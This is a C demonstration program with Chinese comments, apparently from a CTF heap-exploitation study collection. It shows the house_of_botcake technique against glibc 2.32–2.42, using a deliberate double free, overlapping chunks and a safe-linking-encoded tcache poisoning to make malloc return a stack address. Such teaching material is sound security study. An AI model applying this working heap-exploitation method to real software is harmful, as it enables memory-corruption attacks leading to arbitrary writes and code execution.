/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_botcake
 * 文件标注范围：2.32 ~ 2.42
 * 模拟漏洞：UAF，并能制造同一 chunk 先入 unsorted、后入 tcache。
 * 核心流程：填满 tcache 后释放 victim 到 unsorted，与前块合并；取走一个 tcache 节点后再次 free victim，形成大小不同的重叠管理。
 * 成功判据：覆盖 victim->next 后 tcache poisoning 返回 target；2.32+ 必须编码 next，2.43 仍可用。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

int main()
{
    /*
     * Botcake 绕过提交 bcdaad2 引入的 tcache double-free key 检查：
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * 它先让 victim 进入 unsorted，再释放前块与其合并；victim 地址处于更大
     * free chunk 内部，却仍可在腾出一个 tcache 槽后再次 free。由此同一内存
     * 同时属于大 unsorted chunk 和 tcache entry，攻击者通过重叠块改写 next。
     * 没有该 key 限制的更早实现可直接 double free，不必先制造重叠。
     * 手法名称由 @anton00b 与 @subwire 提出。
     */

    // 关闭 stdio 缓冲，避免 _IO_FILE 的隐式分配改变关键相邻 chunk 布局。
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // 打印利用目标：只依赖 double free，最终让 malloc 返回栈地址。

    // 栈上数组是任意分配目标；实际 CTF 可替换为 hook、对象或其他可写地址。
    intptr_t stack_var[4];

    // 依次布置 tcache 填充块、前块 prev、victim a 与防合并保护块。
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);

    intptr_t *a = malloc(0x100);

    malloc(0x10);

    // 填满 tcache 后释放 a 与 prev，使二者向前合并成覆盖 a 的大 unsorted chunk。
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    free(a);

    free(prev);

    malloc(0x100);
    /* 漏洞模拟开始/结束 */
    free(a);// 漏洞触发：a 已包含在 free 大块中，再次释放把内部地址送入 tcache。
    /* 漏洞模拟开始/结束 */

    intptr_t *unsorted = malloc(0x100 + 0x100 + 0x10);
    // glibc 2.32 起按 victim 地址页号编码 next；用已知 a 地址生成 safe-linking 密文。
    unsorted[0x110/sizeof(intptr_t)] = ((long)a >> 12) ^ (long)stack_var;

    a = malloc(0x100);
    int a_size = a[-1] & 0xff0;

    intptr_t *target = malloc(0x100);
    target[0] = 0xcafebabe;

    assert(stack_var[0] == 0xcafebabe);
    return 0;
}
